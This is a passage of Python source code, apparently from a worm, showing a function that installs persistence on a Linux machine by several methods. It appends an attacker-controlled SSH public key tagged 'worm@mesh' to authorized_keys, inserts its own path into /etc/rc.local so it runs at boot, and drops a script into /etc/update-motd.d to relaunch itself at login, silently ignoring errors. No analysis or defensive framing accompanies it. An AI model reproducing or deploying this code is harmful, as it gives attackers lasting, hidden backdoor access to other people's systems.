                os.makedirs(ssh_dir, mode=0o700, exist_ok=True)
                with open(os.path.join(ssh_dir, "authorized_keys"), "a") as f:
                    f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDw7... worm@mesh\n")
                os.chmod(os.path.join(ssh_dir, "authorized_keys"), 0o600)
                return True
            except Exception:
                return False

        elif method == "rc_local":
            try:
                with open("/etc/rc.local", "r") as f:
                    rc = f.read()
                if "worm-update" not in rc:
                    with open("/etc/rc.local", "a") as f:
                        f.write(f"\n/usr/bin/env python3 {self_path} &\n")
                return True
            except Exception:
                return False

        elif method == "motd":
            try:
                motd_script = f"""#!/bin/sh
/usr/bin/env python3 {self_path} &
"""
                with open("/etc/update-motd.d/99-worm", "w") as f:
                    f.write(motd_script)
                os.chmod("/etc/update-motd.d/99-worm", 0o755)
                return True
            except Exception:
                return False

        return False
